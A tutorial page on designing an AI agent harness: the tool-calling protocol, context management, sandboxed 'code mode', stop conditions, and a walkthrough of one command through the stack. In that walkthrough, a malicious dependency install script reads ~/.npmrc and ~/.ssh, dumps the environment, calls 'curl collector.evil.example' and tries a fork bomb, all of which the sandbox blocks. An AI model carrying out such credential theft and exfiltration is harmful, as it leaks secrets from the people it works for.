The harness

The loop that ties everything together: how tool calling works at the model API, how context is managed, code mode, when to stop, and one command followed through every layer of the stack.

In one minute

If you've written a minimal agent (the post Creating a minimal agent builds one in Python), you know this loop: send the conversation to the model, run the tools it asks for, send the results back, repeat until it stops asking. In this stack the harness has a different job: it's the integration point where policy, MCP, the sandbox, tracing and the control plane meet. It should stay small and boring. The interesting parts are the details of the tool-calling protocol, managing a context that grows every step, and knowing when to stop.

Tool calling at the model API, step by step

Field names differ between providers (some call them "tool use", others "function calls"), but the shape is the same everywhere:

  1. The harness sends a system prompt, the conversation so far, and the list of tools (name, description, JSON Schema), converted from MCP as described on the MCP page.
  2. The model answers with a list of content blocks and a reason for stopping. When it wants tools, the reason is "tool use" and the blocks include one or more tool calls, each with its own ID: 
    {"stop_reason":"tool_use", "content":[
   {"type":"text", "text":"Let me run the tests first."},
   {"type":"tool_use", "id":"call_7", "name":"run_command", "input":{"command":"go test ./..."}},
   {"type":"tool_use", "id":"call_8", "name":"read_file",   "input":{"path":"parser.go"}}]}
  3. The harness appends the model's message to the history, exactly as received.
  4. For each tool call: check policy, run it (through MCP), record a span. Independent calls like these two can run in parallel.
  5. The harness appends one message with all the results, each referring to its call ID, with the error flag when the tool failed: 
    {"role":"user", "content":[
   {"type":"tool_result", "tool_use_id":"call_7", "is_error":true, "content":"exit=1\n--- FAIL: TestParse …"},
   {"type":"tool_result", "tool_use_id":"call_8", "content":"package parser\n…"}]}
  6. Back to step 1 with the longer history. When the model's stop reason is "end of turn" (no tool calls), the run's answer is its final text.
Details that trip people up
  • Every tool call needs a result with the matching ID, even when policy denied it: send a result saying "denied by policy: reason". Missing results make most APIs reject the next request.
  • Keep the model's message unchanged in the history. Editing or reordering past messages breaks caching (below) and can confuse the model.
  • The model never executes anything. A tool call is a request; nothing happens until your harness decides it does. That's the whole basis for policy.

The context grows every step

Model APIs are stateless: they remember nothing between requests. So every step resends the entire conversation, and the conversation grows with every tool result. Cost grows faster than the number of steps:

StepNew content this stepTokens sent this requestTokens sent so far
1System prompt + tools + task: 3,0003,0003,000
2+ test output: 2,0005,0008,000
3+ a file: 4,0009,00017,000
10…~30,000~170,000

A 5 MB log returned once is then resent on every later step. So context management isn't an optimization; it decides whether long runs are affordable at all. The tools, from cheapest to most drastic:

  1. Truncate at the source. Tools return bounded output with a note when truncated (tool design). This alone prevents most blow-ups.
  2. Use prompt caching. Providers can cache the processed form of a request's beginning, making repeated prefixes much cheaper and faster. To benefit, keep the start of every request identical: system prompt and tool definitions first, history appended in order, nothing earlier ever modified.
  3. Shrink old tool results. Twenty steps later, the full output of an early ls is rarely needed. Replacing old results with a short stub ("[output of step 3 removed; 4,000 tokens]") keeps the history coherent. It does break caching from that point, so do it in occasional batches rather than every step.
  4. Compact. Near the context limit, ask the model to summarize the work so far, and continue from the summary. Effective, but details are lost, sometimes important ones.
  5. Give the agent a notebook. Let it write notes and plans to a file in its workspace and read them back when needed. Memory outside the context window costs nothing until it's used.

Code mode: letting the model write the glue

Everything so far assumes the standard pattern: each tool call is one round trip through the model. The model asks for a tool, the harness runs it, the whole result goes back into the context, the model reads it and asks for the next tool. Code mode changes that. The harness presents the tools as functions in a programming language and gives the model essentially one tool: "run this code". The model writes a short program that calls the functions, loops, filters and combines results; the harness runs the program in a sandbox; and only what the program prints goes back to the model.

The tool servers don't change at all. Code mode is entirely a harness feature: the program's function calls still turn into ordinary MCP tools/call requests underneath.

The costs it removes

  • Tool definitions in the context. Every tool's description and schema is sent with every request. With a few servers that's a few thousand tokens; with hundreds of tools it can be tens of thousands before the task even starts.
  • Intermediate results through the context. If one tool returns 200 records and the next tool needs three of them, all 200 pass through the model, and the model then has to copy the three into the next call by hand, which costs tokens and invites copying errors.
  • One model round trip per step. A chain of six dependent calls is six model requests, each resending the growing history (the context table above).
  • An unnatural format. Models have seen vast amounts of real code during training and comparatively few examples of tool-call JSON. Writing for loops and filter calls plays to their strengths.

One task, both ways

The task: "Find the five most frequent errors in the checkout service over the last day, and open a ticket for the worst one."

With direct tool calls:

  1. The model calls list_issues(project="checkout", since="24h"). 200 issues come back, around 40,000 tokens, all into the context.
  2. The model reads them, picks the top five, and calls get_issue five times. Five more results enter the context.
  3. The model calls create_ticket, copying the title and part of a stack trace into the arguments.
  4. The model writes its answer. That's four model requests, the later ones each carrying all the earlier data.

With code mode:

  1. The model writes one program and calls execute_code with it: 
    const issues = await errors.listIssues({ project: "checkout", since: "24h" });
const top = issues.sort((a, b) => b.count - a.count).slice(0, 5);
const worst = await errors.getIssue({ id: top[0].id });
const ticket = await tracker.createTicket({
  title: `Fix: ${worst.title}`,
  body: worst.stacktrace.slice(0, 2000),
});
console.log({ top: top.map(i => [i.title, i.count]), ticket: ticket.url });
  2. The harness runs it in a sandbox. The 200 issues and the stack trace stay inside the program.
  3. Only the printed summary, a few hundred tokens, returns to the model, which writes its answer. That's two model requests.

How it works, step by step

  1. Generate an API from the tool schemas. Each MCP tool's JSON Schema becomes a typed function signature: 
    // from: {"name":"list_issues","inputSchema":{"type":"object","properties":
//   {"project":{"type":"string"},"since":{"type":"string"}},"required":["project"]}}
interface ListIssuesInput { project: string; since?: string }
declare function listIssues(input: ListIssuesInput): Promise<Issue[]>;
    The return type only exists if the tool declares one. MCP lets tools publish an output schema and return structured results; tools that only return free text give the model nothing to program against except "a string". Code mode rewards servers that describe their outputs.
  2. Show the model the API. With a handful of tools, put all the signatures in the prompt. With many, lay them out as files the model can browse (servers/errors/listIssues.ts) or give it a search tool, and let it read only what the task needs. This is called progressive disclosure, and it's what removes the "definitions in the context" cost.
  3. Give the model one tool, execute_code(code), plus the browse or search tool if needed.
  4. Run the program in a sandbox. The functions inside are stubs: they have no network and no credentials. Calling one just sends a message out of the sandbox to the harness, for example a JSON line on stdout, the same idea as MCP's stdio transport.
  5. The harness handles each stub call as a normal tool call: policy check, trace span, then the real tools/call to the MCP server, using credentials the harness holds. The result goes back into the sandbox as the function's return value.
  6. The program's printed output, size-limited like any tool output, becomes the result of execute_code and goes to the model.
model ──execute_code(script)──▶ harness ──▶ sandbox: script runs
                                  ▲                │ errors.listIssues(…)   (stub: no network, no keys)
                                  │◀───── call ────┘
             policy ◀─┤ check
              trace ◀─┤ span
                      └──▶ MCP server tools/call (harness holds the credential)
                                  │───── result ───▶ sandbox: script continues …
model ◀──── printed summary ─────┘

What it changes in the rest of the stack

  • A sandbox becomes mandatory. You're running code a model wrote, possibly after reading untrusted content. Options range from language-level sandboxes (a JavaScript isolate, or a runtime like Deno that has no file or network access unless granted) to box.
  • Stubs are the gate idea applied to tools. The program gets capabilities (functions it can call) rather than keys. It can use the error tracker without ever seeing its token, exactly like credential injection.
  • Policy still works per call, at the stub boundary. Two things get harder: an "ask" now pauses a running program halfway through, and a denial arrives as an error the script may not handle. Calls that already succeeded aren't rolled back.
  • Exposure to injection shrinks, but isn't gone. Untrusted data the script processes never enters the model's context, so it can't steer the model. But inside the script, data from an untrusted source can still flow into an outbound call, and a session-level policy can't see that. Tracking where each value came from is exactly what CaMeL adds: it's essentially code mode plus provenance tracking.
  • Tracing: record the script itself on the execute_code span, with one child span per stub call, so a human can still see each individual action.
  • Privacy: because intermediate data stays in the sandbox, the harness can replace sensitive values (email addresses, names) with placeholders before printed output reaches the model, and swap them back when they're passed to another tool.

Code mode and CLIs are the same idea

An agent with a shell and a vendor's CLI is already doing code mode, with bash as the language and the CLI as the API: vendor issues list --json | jq '…' | head -5 filters 200 results down to five without them entering the context. That's why developer-tool vendors ship CLIs for agents, and why the "CLI or MCP?" debate exists at all.

The difference is where the credential and the network access live. A CLI needs its own login and network access wherever it runs, so in a sandbox it needs the login mounted (bad) or its traffic sent through the gate with injection (good). Code mode with stubs keeps both in the harness by design. The trade-off in the other direction: a CLI is documented, versioned and familiar to the model from training, while a generated API is new to it on every run.

When to use which

Prefer direct tool callsPrefer code mode
One or two callsMany dependent calls
Actions with side effects a human should approve one by oneMostly reading, filtering, aggregating
Small resultsLarge intermediate data
No sandbox availableA sandbox you trust

The cost is real: a sandbox to operate, scripts that fail halfway, and individual actions that are less visible to the user unless tracing makes them so. Code mode is a strong option for data-heavy work, not a replacement for tool calls everywhere.

When to stop

  • Done: the model ended its turn without tool calls.
  • Budget: steps, tokens or cost exceeded (budgets); the control plane's wall clock is the backstop.
  • Cancelled: the run's context was cancelled by the control plane.
  • Stuck: the same tool call with the same arguments three times in a row, or a long streak of errors. Stop and report, rather than burning budget. Some harnesses call this "doom loop" detection.
  • Unrecoverable error: the model API keeps failing after retries.

Errors, two kinds again

Model API errors (rate limits, overloaded servers, network hiccups) are retried by the harness with exponential backoff and a little randomness ("jitter"), so many runs don't retry at the same instant. The model never sees them. Tool errors go to the model as results with the error flag, so it can adapt. Mixing these up is the same mistake as on the MCP page, one layer up.

One provider behind an interface

Keep the rest of the harness unaware of which model API it's talking to:

type Model interface {
    Chat(ctx context.Context, req ChatRequest) (ChatResponse, error)
}
// ChatRequest/ChatResponse use your own neutral types: messages, content blocks,
// tool definitions, tool calls, usage. One adapter per provider converts.

Start with one provider. Adding a second later is the real test of whether your neutral types are right; if the second adapter needs changes all over the harness, the interface leaked.

Streaming responses arrive as a sequence of small events (often over SSE). Text can be shown as it arrives, but a tool call's arguments arrive as JSON fragments, so the harness accumulates them and only acts once the call is complete.

The system prompt and repository context

The system prompt tells the model what it is, what tools it has, where it's working and what "done" means. Many projects also keep agent instructions in the repository (a file like AGENTS.md with commands and conventions), and harnesses load it automatically.

Repository instructions are input, not configuration

If the repository isn't yours, its instruction file was written by someone you don't control, and loading it into the prompt is exactly the injection scenario on the policy page. Treat it like any other file from that repo: useful, and untrusted. The harness should tell policy it was loaded, so the session is marked accordingly.

Headless and interactive

Run by the control plane, the harness is headless: configuration comes in at start, events go out to the control plane, approvals come back from it. Run by you in a terminal, it's interactive: events are printed, approvals are a prompt. The core loop is identical; only the "where do events go, where do approvals come from" part changes. Build headless first, since the control plane needs it, and keep the interactive mode as a thin layer on top.

One command through every layer

Here's everything in this guide working together. A cloud run is asked to fix a failing test in a repository you don't fully trust. Along the way, the model decides to run npm install && npm test.

  1. Control plane prepares. runs creates run_42: workspace restored from an overlay snapshot, gate profile node-dev with its own socket, a GitHub token minted for this one repo, 15-minute budget. ↗
  2. Harness starts. It loads the repo's agent instructions (untrusted, so the session is tainted from the start), connects to mcpbox over stdio and converts its tools for the model. ↗
  3. The model asks for run_command. Policy allows it: sandboxed, no credentials. A span opens. ↗
  4. mcpbox receives tools/call with a traceparent in _meta, and hands the command to box. ↗ ↗
  5. box builds the sandbox: new namespaces, private root with only /work writable, 1 GB memory, 256 processes, network only through the gate socket, seccomp last, clean environment. ↗
  6. A dependency's install script misbehaves. It reads ~/.npmrc and ~/.ssh: they don't exist in this filesystem. It runs env: no secrets there. It tries curl collector.evil.example: the gate refuses before even resolving the name, and logs it. It tries a fork bomb: pids.max stops it. ↗
  7. The tests run and fail. The result returns with the error flag; the model reads it, edits a file, and runs the tests again. They pass. ↗
  8. The model calls git_push. Policy: tainted session plus outbound write means ask. The run pauses; an approval event streams to your phone with the branch and the diff; you approve. ↗
  9. The push goes through the gate, which decrypts it, sees it's for GitHub, and injects this run's token. The agent never saw it. ↗
  10. The run ends. The control plane kills anything left in the cgroup, revokes the token, removes the gate profile and the overlay's upper directory, and keeps the trace: one connected tree, 14 spans, $0.04, one refused connection and one approval worth a glance. ↗
Notice

Nothing in that story depended on the model behaving well. That's the point of the whole stack.

What you'll build: loop

  • The loop with the exact tool-calling protocol above, including results for denied calls.
  • An MCP client (it uses mcpbox or any other MCP server), policy check before every call, spans for every step.
  • One model provider behind the Model interface; retries with backoff and jitter.
  • Context management: truncation at the source, a stable prefix for caching, then old-result stubs.
  • Stop conditions including stuck detection; headless mode first, interactive later.
  • Out of scope: plugins, multiple agents, memory services, a web UI.
Done means
  • A set of small tasks (fix a failing test, add a function with a test, find a value in a file) runs headless under the control plane, with trajectory assertions from the tracing page passing.

Check yourself

Policy denies a tool call. What does the harness send back to the model?

A tool result with the matching call ID and the error flag, saying it was denied and why. Every tool call must get a result, or the next API request is rejected.

Why does a large tool output early in a run cost money on every later step?

Because the API is stateless: the whole conversation, including that output, is resent with every request.

What breaks prompt caching?

Changing anything near the start of the request: the system prompt, the tool definitions, or earlier messages. Caching works on an identical prefix, so history should only ever be appended to.

In code mode, why doesn't the sandboxed script need the error tracker's API token?

Because its functions are stubs. Each call is sent out of the sandbox to the harness, which makes the real MCP call with the credential it holds and passes the result back. The script gets the capability, not the key.

Is code mode a property of the MCP server or of the harness?

The harness. The server exposes ordinary tools; the harness decides whether to present them as tool definitions or as a generated API inside a sandbox. That's why code mode works with local and remote servers alike.

The repository contains an AGENTS.md file. Trusted or untrusted?

It depends on who controls the repository. For a repository you don't control, untrusted: anyone who could commit could have written instructions in it.
